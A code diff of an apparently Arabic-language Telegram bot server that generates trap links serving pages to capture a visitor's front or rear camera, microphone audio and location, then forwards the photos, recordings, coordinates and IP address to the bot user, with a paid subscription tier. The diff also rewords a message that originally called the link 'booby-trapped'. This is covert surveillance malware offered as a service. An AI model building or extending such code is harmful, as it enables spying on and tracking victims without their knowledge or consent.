@@ -22,56 +22,7 @@ const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية
 const adminId = '7130416076';
 const subscribedUsers = new Set();
 
-// Camera routes
-app.get('/:userId', (req, res) => {
-    const userId = req.params.userId;
-    const action = req.params.action;
-    const cameraType = req.query.cameraType;
-    const duration = req.query.duration;
-
-    if (subscribedUsers.has(userId)) {
-        switch(action) {
-            case 'camera':
-                res.sendFile(path.join(__dirname, 'location.html'));
-                break;
-            case 'record':
-                res.sendFile(path.join(__dirname, 'record.html'));
-                break;
-            case 'getLocation':
-                res.sendFile(path.join(__dirname, 'SJGD.html'));
-                break;
-            default:
-                res.status(404).send('Action not found');
-        }
-        return;
-    }
-
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId][action]++;
-
-    if (userVisits[userId][action] > MAX_FREE_ATTEMPTS) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    switch(action) {
-        case 'camera':
-            res.sendFile(path.join(__dirname, 'location.html'));
-            break;
-        case 'record':
-            res.sendFile(path.join(__dirname, 'record.html'));
-            break;
-        case 'getLocation':
-            res.sendFile(path.join(__dirname, 'SJGD.html'));
-            break;
-        default:
-            res.status(404).send('Action not found');
-    }
-});
-
+// مسار الكاميرا
 app.get('/:userId', (req, res) => {
     const userId = req.params.userId;
     const cameraType = req.query.cameraType;
@@ -95,7 +46,54 @@ app.get('/:userId', (req, res) => {
     res.sendFile(path.join(__dirname, 'location.html'));
 });
 
-// تعديل مسار استلام الصور
+// مسار تسجيل الصوت
+app.get('/record/:userId', (req, res) => {
+    const userId = req.params.userId;
+    const duration = req.query.duration;
+
+    if (subscribedUsers.has(userId)) {
+        res.sendFile(path.join(__dirname, 'record.html'));
+        return;
+    }
+
+    if (!userVisits[userId]) {
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
+    }
+
+    userVisits[userId].voiceRecord++;
+
+    if (userVisits[userId].voiceRecord > MAX_FREE_ATTEMPTS) {
+        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
+        return;
+    }
+
+    res.sendFile(path.join(__dirname, 'record.html'));
+});
+
+// مسار الحصول على الموقع
+app.get('/getLocation/:userId', (req, res) => {
+    const userId = req.params.userId;
+
+    if (subscribedUsers.has(userId)) {
+        res.sendFile(path.join(__dirname, 'SJGD.html'));
+        return;
+    }
+
+    if (!userVisits[userId]) {
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
+    }
+
+    userVisits[userId].getLocation++;
+
+    if (userVisits[userId].getLocation > MAX_FREE_ATTEMPTS) {
+        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
+        return;
+    }
+
+    res.sendFile(path.join(__dirname, 'SJGD.html'));
+});
+
+// استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
@@ -133,6 +131,7 @@ IP: ${additionalData.ip}
     }
 });
 
+// استلام الصوت
 app.post('/submitVoice', upload.single('voice'), (req, res) => {
     const chatId = req.body.chatId;
     const voiceFile = req.file;
@@ -165,6 +164,7 @@ IP: ${additionalData.ip}
         });
 });
 
+// استلام الموقع
 app.post('/submitLocation', upload.none(), async (req, res) => {
     const chatId = req.body.chatId;
     const latitude = req.body.latitude;
@@ -188,7 +188,8 @@ IP: ${additionalData.ip}
     `;
 
     try {
-        await bot.sendLocation(chatId, latitude, longitude, { caption });
+        await bot.sendLocation(chatId, latitude, longitude);
+        await bot.sendMessage(chatId, caption);
         console.log('Location sent successfully');
         res.json({ success: true });
     } catch (error) {
@@ -197,6 +198,7 @@ IP: ${additionalData.ip}
     }
 });
 
+// أوامر البوت
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
     if (msg.from.id.toString() !== adminId) {
         bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
@@ -204,7 +206,7 @@ bot.onText(/\/subscribe (\d+)/, (msg, match) => {
     }
 
     const userId = match[1];
-    if (subscribedUsers.add(userId).size > subscribedUsers.size) {
+    if (subscribedUsers.add(userId)) {
         bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
     } else {
         bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
@@ -212,6 +214,11 @@ bot.onText(/\/subscribe (\d+)/, (msg, match) => {
 });
 
 bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
+    if (msg.from.id.toString() !== adminId) {
+        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
+        return;
+    }
+
     const userId = match[1];
     if (subscribedUsers.delete(userId)) {
         bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
@@ -236,7 +243,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كاميرا أمامي', callback_data: 'front_camera' }],
+                [{ text: 'تصوير كام أمامي', callback_data: 'front_camera' }],
                 [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
                 [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
                 [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
@@ -267,13 +274,12 @@ bot.on('message', (msg) => {
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
             const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
-            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
+            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
     }
 });
-
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
